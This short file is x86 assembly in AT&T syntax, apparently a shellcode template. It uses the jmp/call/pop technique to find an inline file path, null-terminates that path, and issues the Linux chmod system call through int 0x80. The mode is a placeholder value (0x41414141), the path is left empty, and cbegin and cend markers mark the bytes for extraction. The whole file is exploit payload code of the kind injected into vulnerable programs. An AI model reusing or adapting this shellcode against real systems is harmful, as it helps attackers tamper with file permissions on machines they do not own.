
	.globl	cbegin
	.globl	cend


cbegin:
	jmp	file

chmod:
	xorl	%eax,		%eax
	popl	%ebx
	movb	%al,		0x4(%ebx)
	movl	$0x41414141,	%ecx

	movb	$0xf,		%al
	int	$0x80

file:
	call	chmod
	.ascii ""

cend:

